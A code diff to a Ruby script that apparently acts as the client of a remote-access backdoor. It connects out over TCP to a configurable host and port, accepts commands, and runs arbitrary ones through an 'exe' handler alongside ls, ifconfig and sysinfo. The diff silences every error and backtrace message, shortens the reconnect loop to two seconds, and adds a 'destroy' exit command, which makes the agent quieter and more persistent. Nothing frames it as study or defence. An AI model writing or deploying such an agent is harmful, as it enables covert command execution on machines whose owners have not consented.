@@ -1,5 +1,8 @@
 #!/usr/bin/env ruby
 
+# !!! Exception messages are commented out for performance
+# !!! Ensure to uncomment when debugging
+
 require_relative "helpers.rb"
 
 def handle_client(client)
@@ -13,7 +16,7 @@ def handle_client(client)
       begin
         result = Helpers.exe(data.gsub('exe ', ''))
       rescue Exception => e
-        puts e.message
+        #puts e.backtrace
       end
     when 'ls'
       result = Helpers.ls
@@ -25,8 +28,8 @@ def handle_client(client)
       result = Helpers.ifconfig
     when 'sysinfo'
       result = Helpers.sysinfo
-    when 'wget'
-      result = wget(action)
+    when 'destroy'
+      return 42
     end
 
     result = result.to_s
@@ -42,35 +45,32 @@ def main(timeout)
 
   # If host/port is not passed in ARGV, default to localhost:3000
   host ||= "localhost"
-  port ||= 3000
-
-  status = 0
+  port ||= 3200
 
   # Main loop around handle_client loop to repeat attempt server connection
   loop do
     client = nil
     begin
       client = TCPSocket.new(host, port)
-    rescue Errno::ECONNRESET, Errno::ECONNRESET => e
-      puts e.backtrace.join("\n")
+    rescue Exception => e
+      #puts e.backtrace
       sleep(timeout)
     end
 
+    exit_code = 0
     begin
-      status = handle_client(client)
+      exit_code = handle_client(client)
     rescue Interrupt
       exit 0
     rescue Exception => e
-      puts e.to_s
-      puts e.backtrace.join("\n")
-      next
+      #puts e.backtrace
     end
 
-    if status
+    if exit_code == 42
       exit 0
     end
   end
 end
 
-TIMEOUT = 20
+TIMEOUT = 2
 main(TIMEOUT)
